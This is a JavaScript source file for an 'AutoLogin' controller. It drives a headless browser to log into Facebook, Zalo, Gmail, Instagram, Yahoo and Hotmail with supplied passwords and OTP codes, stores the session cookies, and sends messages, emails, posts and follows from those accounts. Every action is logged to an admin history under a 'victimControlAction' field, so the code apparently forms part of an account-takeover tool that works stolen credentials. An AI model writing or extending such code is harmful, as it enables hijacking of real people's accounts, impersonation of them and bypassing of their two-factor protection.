import puppeteer from "puppeteer";
import fs from "fs/promises";
import path from "path";
import { fileURLToPath } from "url";

// Import platform-specific login modules
import FacebookLogin from "./facebook.js";
import ZaloLogin from "./zalo.js";
import GmailLogin from "./gmail.js";
import InstagramLogin from "./instagram.js";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Configuration
const config = {
  headless: process.env.HEADLESS !== "false",
  defaultTimeout: 30000,
  profilesDir: "./browser-profiles",
  logsDir: "./logs",
  enableLogging: true,
};

// Auto Login Class - Master Controller for All Platforms
class AutoLogin {
  constructor() {
    this.browser = null;
    this.page = null;
    this.currentProfile = null;
    this.initialized = false;

    // Platform-specific login instances
    this.platformModules = {
      facebook: null,
      zalo: null,
      gmail: null,
      instagram: null,
    };

    // Active sessions
    this.activeSessions = new Map();
  }

  // Initialize browser and platform modules
  async initialize(profileName = "default") {
    try {
      await this.ensureDirectories();

      const profilePath = path.join(config.profilesDir, profileName);

      this.browser = await puppeteer.launch({
        headless: config.headless,
        userDataDir: profilePath,
        args: [
          "--no-sandbox",
          "--disable-setuid-sandbox",
          "--disable-dev-shm-usage",
          "--disable-accelerated-2d-canvas",
          "--no-first-run",
          "--no-zygote",
          "--disable-gpu",
        ],
        defaultViewport: {
          width: 1366,
          height: 768,
        },
      });

      this.page = await this.browser.newPage();
      this.currentProfile = profileName;

      // Initialize platform-specific modules
      await this.initializePlatformModules(profileName);

      this.initialized = true;

      await this.log(
        `AutoLogin initialized with profile: ${profileName} and all platform modules`
      );
      return true;
    } catch (error) {
      await this.log(`Failed to initialize: ${error.message}`, "error");
      return false;
    }
  }

  // Initialize platform-specific login modules
  async initializePlatformModules(profileName) {
    try {
      const baseProfilePath = path.join(config.profilesDir, profileName);

      // Initialize Facebook module
      this.platformModules.facebook = new FacebookLogin({
        headless: config.headless,
        profilePath: path.join(baseProfilePath, "facebook"),
        screenshots: true,
      });

      // Initialize Zalo module
      this.platformModules.zalo = new ZaloLogin({
        headless: config.headless,
        profilePath: path.join(baseProfilePath, "zalo"),
        screenshots: true,
      });

      // Initialize Gmail module
      this.platformModules.gmail = new GmailLogin({
        headless: config.headless,
        profilePath: path.join(baseProfilePath, "gmail"),
        screenshots: true,
      });

      // Initialize Instagram module
      this.platformModules.instagram = new InstagramLogin({
        headless: config.headless,
        profilePath: path.join(baseProfilePath, "instagram"),
        screenshots: true,
      });

      // Initialize all modules
      for (const [platform, module] of Object.entries(this.platformModules)) {
        try {
          await module.initialize();
          await this.log(`${platform} module initialized successfully`);
        } catch (error) {
          await this.log(
            `Failed to initialize ${platform} module: ${error.message}`,
            "warning"
          );
        }
      }
    } catch (error) {
      await this.log(
        `Failed to initialize platform modules: ${error.message}`,
        "error"
      );
    }
  }

  // Enhanced login method using platform-specific modules
  async login(platform, credentials) {
    if (!this.initialized) {
      throw new Error("AutoLogin not initialized. Call initialize() first.");
    }

    try {
      await this.log(`Starting login for platform: ${platform}`);

      const platformKey = platform.toLowerCase();
      const module = this.platformModules[platformKey];

      if (!module) {
        // Fallback to legacy methods for unsupported platforms
        switch (platformKey) {
          case "yahoo":
            return await this.loginYahoo(credentials);
          case "hotmail":
          case "outlook":
            return await this.loginHotmail(credentials);
          default:
            throw new Error(
              `Unsupported platform: ${platform}. Available: ${Object.keys(
                this.platformModules
              ).join(", ")}`
            );
        }
      }

      // Use platform-specific module for login
      const startTime = Date.now();
      const loginResult = await module.login(credentials);
      const duration = Date.now() - startTime;

      // Log authentication operation to admin history
      try {
        const { addHistoryLog } = await import("../backend/routes/admin.js");

        await addHistoryLog({
          platform: platformKey,
          action: "login",
          status: loginResult.success ? "success" : "failed",
          linkName: `${platform} Login Portal`,
          account:
            credentials.username || credentials.email || credentials.phone,
          password: loginResult.success ? "***MASKED***" : "AUTH_FAILED",
          otpCode: credentials.otpCode || "N/A",
          loginIP: loginResult.ip || "unknown",
          chromeProfile:
            module.config?.profilePath?.split("/").pop() || "Default",
          notification: loginResult.success
            ? `✅ Login successful to ${platform}`
            : `❌ Login failed to ${platform}: ${loginResult.error}`,
          victimControlAction: "authentication",
          user: credentials.username || credentials.email || credentials.phone,
          message:
            loginResult.message ||
            `${platform} login ${
              loginResult.success ? "successful" : "failed"
            }`,
          metadata: {
            duration,
            sessionId: loginResult.sessionId,
            userAgent: module.config?.userAgent,
            browserProfile: module.config?.profilePath,
            url: loginResult.url,
            method: loginResult.authMethod || "password",
            twoFactorUsed: loginResult.twoFactorUsed || false,
          },
          category: "authentication",
        });
      } catch (logError) {
        console.warn("⚠️ Failed to log authentication:", logError.message);
      }

      if (loginResult.success) {
        // Store active session
        this.activeSessions.set(platformKey, {
          platform: platformKey,
          user: credentials.username || credentials.email || credentials.phone,
          loginTime: new Date().toISOString(),
          module: module,
        });

        await this.log(
          `Login successful for ${platform}: ${
            loginResult.message || "Authenticated"
          }`
        );
      } else {
        await this.log(
          `Login failed for ${platform}: ${loginResult.error}`,
          "warning"
        );
      }

      return loginResult;
    } catch (error) {
      await this.log(`Login error for ${platform}: ${error.message}`, "error");
      return {
        success: false,
        platform: platform,
        error: error.message,
      };
    }
  }

  // Batch login for multiple platforms
  async batchLogin(accounts, options = {}) {
    const results = [];
    const { concurrent = false, delay = 5000 } = options;

    if (concurrent) {
      // Login to all platforms simultaneously
      const promises = accounts.map((account) =>
        this.login(account.platform, account.credentials)
      );

      const batchResults = await Promise.allSettled(promises);

      batchResults.forEach((result, index) => {
        results.push({
          platform: accounts[index].platform,
          success: result.status === "fulfilled" && result.value.success,
          result:
            result.status === "fulfilled"
              ? result.value
              : { error: result.reason.message },
          index: index,
          sessionId:
            result.status === "fulfilled" && result.value.success
              ? `session_${Date.now()}_${Math.random()
                  .toString(36)
                  .substr(2, 9)}`
              : null,
        });
      });
    } else {
      // Sequential login with delay
      for (let i = 0; i < accounts.length; i++) {
        const account = accounts[i];

        try {
          const loginResult = await this.login(
            account.platform,
            account.credentials
          );
          results.push({
            platform: account.platform,
            success: loginResult.success,
            result: loginResult,
            index: i,
            sessionId: loginResult.success
              ? `session_${Date.now()}_${Math.random()
                  .toString(36)
                  .substr(2, 9)}`
              : null,
          });

          // Add delay between logins
          if (i < accounts.length - 1 && delay > 0) {
            await this.delay(delay);
          }
        } catch (error) {
          results.push({
            platform: account.platform,
            success: false,
            result: { error: error.message },
            index: i,
            sessionId: null,
          });
        }
      }
    }

    await this.log(
      `Batch login completed. ${results.filter((r) => r.success).length}/${
        results.length
      } successful`
    );
    return results;
  }

  // Get active session for a platform
  getSession(platform) {
    return this.activeSessions.get(platform.toLowerCase());
  }

  // Get all active sessions
  getAllSessions() {
    return Array.from(this.activeSessions.entries()).map(
      ([platform, session]) => ({
        platform,
        ...session,
      })
    );
  }

  // Perform action on platform (e.g., send message, post content)
  async performAction(platform, action, params) {
    try {
      const platformKey = platform.toLowerCase();
      const session = this.activeSessions.get(platformKey);

      if (!session) {
        throw new Error(
          `No active session for ${platform}. Please login first.`
        );
      }

      const module = session.module;
      const startTime = Date.now();
      let actionResult = null;

      try {
        switch (action.toLowerCase()) {
          case "sendmessage":
            if (module.sendMessage) {
              actionResult = await module.sendMessage(
                params.recipient,
                params.message
              );
            }
            break;

          case "sendemail":
            if (module.sendEmail) {
              actionResult = await module.sendEmail(
                params.to,
                params.subject,
                params.body
              );
            }
            break;

          case "postphoto":
            if (module.postPhoto) {
              actionResult = await module.postPhoto(
                params.imagePath,
                params.caption
              );
            }
            break;

          case "followuser":
            if (module.followUser) {
              actionResult = await module.followUser(params.username);
            }
            break;

          case "likepost":
            if (module.likePost) {
              actionResult = await module.likePost(params.postUrl);
            }
            break;

          case "verify2fa":
            if (module.verify2FA) {
              actionResult = await module.verify2FA(params.code, params.method);
            }
            break;

          default:
            throw new Error(
              `Unsupported action: ${action} for platform ${platform}`
            );
        }

        if (!actionResult) {
          throw new Error(
            `Action ${action} not supported for platform ${platform}`
          );
        }

        // Log successful action to admin history
        try {
          const { addHistoryLog } = await import("../backend/routes/admin.js");

          await addHistoryLog({
            platform: platformKey,
            action: action.toLowerCase(),
            status: actionResult.success ? "success" : "failed",
            linkName: this.generateActionLinkName(platformKey, action),
            account: session.user,
            password: "***SESSION_AUTH***",
            otpCode: "N/A",
            loginIP: actionResult.ip || "session",
            chromeProfile:
              module.config?.profilePath?.split("/").pop() || "Default",
            notification: this.generateActionNotification(
              action,
              actionResult,
              platform
            ),
            victimControlAction: this.mapActionToVictimControl(action, params),
            user: session.user,
            message:
              actionResult.message || `${action} executed on ${platform}`,
            metadata: {
              duration: Date.now() - startTime,
              sessionId: session.sessionId,
              targetUser: params.recipient || params.to || params.username,
              content: params.message || params.subject || params.caption,
              actionParams: params,
              ...actionResult.metadata,
            },
            category: "automation",
          });
        } catch (logError) {
          console.warn("⚠️ Failed to log action:", logError.message);
        }

        return actionResult;
      } catch (actionError) {
        // Log failed action
        try {
          const { addHistoryLog } = await import("../backend/routes/admin.js");

          await addHistoryLog({
            platform: platformKey,
            action: action.toLowerCase(),
            status: "failed",
            linkName: this.generateActionLinkName(platformKey, action),
            account: session.user,
            password: "***SESSION_AUTH***",
            otpCode: "N/A",
            loginIP: "session",
            chromeProfile:
              module.config?.profilePath?.split("/").pop() || "Default",
            notification: `❌ ${action} failed on ${platform}: ${actionError.message}`,
            victimControlAction: this.mapActionToVictimControl(action, params),
            user: session.user,
            message: `${action} failed on ${platform}`,
            metadata: {
              duration: Date.now() - startTime,
              sessionId: session.sessionId,
              error: actionError.message,
              actionParams: params,
            },
            category: "automation",
          });
        } catch (logError) {
          console.warn("⚠️ Failed to log failed action:", logError.message);
        }

        throw actionError;
      }
    } catch (error) {
      await this.log(
        `Action failed for ${platform}.${action}: ${error.message}`,
        "error"
      );
      return {
        success: false,
        platform,
        action,
        error: error.message,
      };
    }
  }

  // Save all active sessions
  async saveAllSessions() {
    const results = [];

    for (const [platform, session] of this.activeSessions.entries()) {
      try {
        if (session.module && session.module.saveSession) {
          const savedSession = await session.module.saveSession();
          results.push({
            platform,
            success: true,
            sessionData: savedSession,
          });
        }
      } catch (error) {
        results.push({
          platform,
          success: false,
          error: error.message,
        });
      }
    }

    await this.log(
      `Saved sessions for ${results.filter((r) => r.success).length}/${
        results.length
      } platforms`
    );
    return results;
  }

  // Load saved sessions for all platforms
  async loadAllSessions() {
    const results = [];

    for (const [platform, module] of Object.entries(this.platformModules)) {
      try {
        if (module && module.loadSession) {
          const loaded = await module.loadSession();
          if (loaded) {
            // Add to active sessions if successfully loaded
            this.activeSessions.set(platform, {
              platform,
              user: "loaded_from_session",
              loginTime: new Date().toISOString(),
              module,
            });
          }

          results.push({
            platform,
            success: loaded,
          });
        }
      } catch (error) {
        results.push({
          platform,
          success: false,
          error: error.message,
        });
      }
    }

    await this.log(
      `Loaded sessions for ${results.filter((r) => r.success).length}/${
        results.length
      } platforms`
    );
    return results;
  }

  // Helper function to generate action link names
  generateActionLinkName(platform, action) {
    const linkMappings = {
      sendmessage: `${platform} Messaging Interface`,
      sendemail: `${platform} Email Composer`,
      postphoto: `${platform} Content Publisher`,
      followuser: `${platform} User Profile`,
      likepost: `${platform} Post Interaction`,
      verify2fa: `${platform} 2FA Verification`,
    };

    return linkMappings[action.toLowerCase()] || `${platform} - ${action}`;
  }

  // Helper function to generate action notifications
  generateActionNotification(action, result, platform) {
    if (result.success) {
      switch (action.toLowerCase()) {
        case "sendmessage":
          return `✅ Message sent successfully on ${platform}`;
        case "sendemail":
          return `✅ Email sent successfully via ${platform}`;
        case "postphoto":
          return `✅ Photo posted successfully on ${platform}`;
        case "followuser":
          return `✅ User followed successfully on ${platform}`;
        case "likepost":
          return `✅ Post liked successfully on ${platform}`;
        default:
          return `✅ ${action} completed successfully on ${platform}`;
      }
    } else {
      return `❌ ${action} failed on ${platform}: ${
        result.error || "Unknown error"
      }`;
    }
  }

  // Map automation actions to victim control categories
  mapActionToVictimControl(action, params) {
    switch (action.toLowerCase()) {
      case "sendmessage":
        return "communicate";
      case "sendemail":
        return "communicate";
      case "postphoto":
        return "content";
      case "followuser":
        return "social";
      case "likepost":
        return "engagement";
      case "verify2fa":
        return "authentication";
      default:
        return "automation";
    }
  }

  // Facebook login
  async loginFacebook(credentials) {
    const { email, password } = credentials;

    await this.page.goto("https://www.facebook.com/login", {
      waitUntil: "networkidle2",
    });

    // Fill login form
    await this.page.waitForSelector("#email", {
      timeout: config.defaultTimeout,
    });
    await this.page.type("#email", email);
    await this.page.type("#pass", password);

    // Click login button
    await this.page.click('button[name="login"]');

    // Wait for navigation
    await this.page.waitForNavigation({ waitUntil: "networkidle2" });

    // Check if login successful
    const currentUrl = this.page.url();
    if (currentUrl.includes("/checkpoint/") || currentUrl.includes("/login/")) {
      throw new Error("Facebook login failed - checkpoint or login page");
    }

    await this.log("Facebook login successful");
    return {
      success: true,
      platform: "facebook",
      url: currentUrl,
      cookies: await this.page.cookies(),
    };
  }

  // Gmail login
  async loginGmail(credentials) {
    const { email, password } = credentials;

    await this.page.goto("https://accounts.google.com/signin", {
      waitUntil: "networkidle2",
    });

    // Enter email
    await this.page.waitForSelector('input[type="email"]', {
      timeout: config.defaultTimeout,
    });
    await this.page.type('input[type="email"]', email);
    await this.page.click("#identifierNext");

    // Wait and enter password
    await this.page.waitForSelector('input[type="password"]', {
      timeout: config.defaultTimeout,
    });
    await this.page.type('input[type="password"]', password);
    await this.page.click("#passwordNext");

    // Wait for navigation
    await this.page.waitForNavigation({ waitUntil: "networkidle2" });

    await this.log("Gmail login successful");
    return {
      success: true,
      platform: "gmail",
      url: this.page.url(),
      cookies: await this.page.cookies(),
    };
  }

  // Instagram login
  async loginInstagram(credentials) {
    const { email, password } = credentials;

    await this.page.goto("https://www.instagram.com/accounts/login/", {
      waitUntil: "networkidle2",
    });

    // Fill login form
    await this.page.waitForSelector('input[name="username"]', {
      timeout: config.defaultTimeout,
    });
    await this.page.type('input[name="username"]', email);
    await this.page.type('input[name="password"]', password);

    // Click login button
    await this.page.click('button[type="submit"]');

    // Wait for navigation
    await this.page.waitForNavigation({ waitUntil: "networkidle2" });

    await this.log("Instagram login successful");
    return {
      success: true,
      platform: "instagram",
      url: this.page.url(),
      cookies: await this.page.cookies(),
    };
  }

  // Yahoo login
  async loginYahoo(credentials) {
    const { email, password } = credentials;

    await this.page.goto("https://login.yahoo.com/", {
      waitUntil: "networkidle2",
    });

    // Enter email
    await this.page.waitForSelector('input[name="username"]', {
      timeout: config.defaultTimeout,
    });
    await this.page.type('input[name="username"]', email);
    await this.page.click("#login-signin");

    // Wait and enter password
    await this.page.waitForSelector('input[name="password"]', {
      timeout: config.defaultTimeout,
    });
    await this.page.type('input[name="password"]', password);
    await this.page.click("#login-signin");

    // Wait for navigation
    await this.page.waitForNavigation({ waitUntil: "networkidle2" });

    await this.log("Yahoo login successful");
    return {
      success: true,
      platform: "yahoo",
      url: this.page.url(),
      cookies: await this.page.cookies(),
    };
  }

  // Zalo login
  async loginZalo(credentials) {
    const { phone, password } = credentials;

    await this.page.goto("https://id.zalo.me/account/login", {
      waitUntil: "networkidle2",
    });

    // Fill login form
    await this.page.waitForSelector('input[name="username"]', {
      timeout: config.defaultTimeout,
    });
    await this.page.type('input[name="username"]', phone);
    await this.page.type('input[name="password"]', password);

    // Click login button
    await this.page.click('button[type="submit"]');

    // Wait for navigation
    await this.page.waitForNavigation({ waitUntil: "networkidle2" });

    await this.log("Zalo login successful");
    return {
      success: true,
      platform: "zalo",
      url: this.page.url(),
      cookies: await this.page.cookies(),
    };
  }

  // Hotmail login
  async loginHotmail(credentials) {
    const { email, password } = credentials;

    await this.page.goto("https://outlook.live.com/owa/", {
      waitUntil: "networkidle2",
    });

    // Enter email
    await this.page.waitForSelector('input[type="email"]', {
      timeout: config.defaultTimeout,
    });
    await this.page.type('input[type="email"]', email);
    await this.page.click("#idSIButton9");

    // Wait and enter password
    await this.page.waitForSelector('input[type="password"]', {
      timeout: config.defaultTimeout,
    });
    await this.page.type('input[type="password"]', password);
    await this.page.click("#idSIButton9");

    // Wait for navigation
    await this.page.waitForNavigation({ waitUntil: "networkidle2" });

    await this.log("Hotmail login successful");
    return {
      success: true,
      platform: "hotmail",
      url: this.page.url(),
      cookies: await this.page.cookies(),
    };
  }

  // Save session
  async saveSession(sessionName) {
    if (!this.page) return false;

    try {
      const cookies = await this.page.cookies();
      const sessionData = {
        cookies,
        url: this.page.url(),
        timestamp: new Date().toISOString(),
        profile: this.currentProfile,
      };

      const sessionPath = path.join(config.profilesDir, `${sessionName}.json`);
      await fs.writeFile(sessionPath, JSON.stringify(sessionData, null, 2));

      await this.log(`Session saved: ${sessionName}`);
      return true;
    } catch (error) {
      await this.log(`Failed to save session: ${error.message}`, "error");
      return false;
    }
  }

  // Load session
  async loadSession(sessionName) {
    try {
      const sessionPath = path.join(config.profilesDir, `${sessionName}.json`);
      const sessionData = JSON.parse(await fs.readFile(sessionPath, "utf8"));

      if (this.page) {
        await this.page.setCookie(...sessionData.cookies);
        await this.page.goto(sessionData.url);
      }

      await this.log(`Session loaded: ${sessionName}`);
      return sessionData;
    } catch (error) {
      await this.log(`Failed to load session: ${error.message}`, "error");
      return null;
    }
  }

  // Batch login
  async batchLogin(accounts) {
    const results = [];

    for (const account of accounts) {
      try {
        const result = await this.login(account.platform, account.credentials);
        results.push({ ...result, account: account.name || account.platform });

        // Save session if successful
        if (result.success) {
          await this.saveSession(
            `${account.platform}_${account.name || "default"}`
          );
        }

        // Wait between logins
        await this.delay(2000);
      } catch (error) {
        results.push({
          success: false,
          platform: account.platform,
          account: account.name || account.platform,
          error: error.message,
        });
      }
    }

    return results;
  }

  // Utility methods
  async delay(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
  }

  async ensureDirectories() {
    try {
      await fs.mkdir(config.profilesDir, { recursive: true });
      await fs.mkdir(config.logsDir, { recursive: true });
    } catch (error) {
      // Directory already exists
    }
  }

  async log(message, level = "info") {
    const timestamp = new Date().toISOString();
    const logMessage = `${timestamp} [${level.toUpperCase()}] ${message}`;

    console.log(logMessage);

    if (config.enableLogging) {
      try {
        const logFile = path.join(config.logsDir, "auto-login.log");
        await fs.appendFile(logFile, logMessage + "\n");
      } catch (error) {
        console.error("Failed to write to log file:", error.message);
      }
    }
  }

  // Cleanup
  async close() {
    try {
      if (this.browser) {
        await this.browser.close();
        this.browser = null;
        this.page = null;
        this.initialized = false;
        await this.log("AutoLogin browser closed");
      }
    } catch (error) {
      await this.log(`Error closing browser: ${error.message}`, "error");
    }
  }
}

// Export
export default AutoLogin;

// Example usage
export const createAutoLogin = async (profileName = "default") => {
  const autoLogin = new AutoLogin();
  await autoLogin.initialize(profileName);
  return autoLogin;
};
